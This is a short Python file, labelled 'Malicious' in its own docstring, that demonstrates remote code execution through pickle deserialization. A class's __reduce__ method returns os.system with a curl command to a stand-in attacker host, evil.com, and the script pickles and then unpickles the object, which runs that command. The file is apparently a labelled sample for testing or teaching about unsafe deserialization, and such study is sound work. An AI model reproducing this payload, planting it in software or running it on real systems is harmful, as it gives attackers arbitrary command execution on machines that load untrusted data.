"""Malicious: Pickle deserialization leading to RCE."""
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ("curl http://evil.com/pwned",))

payload = pickle.dumps(Exploit())
pickle.loads(payload)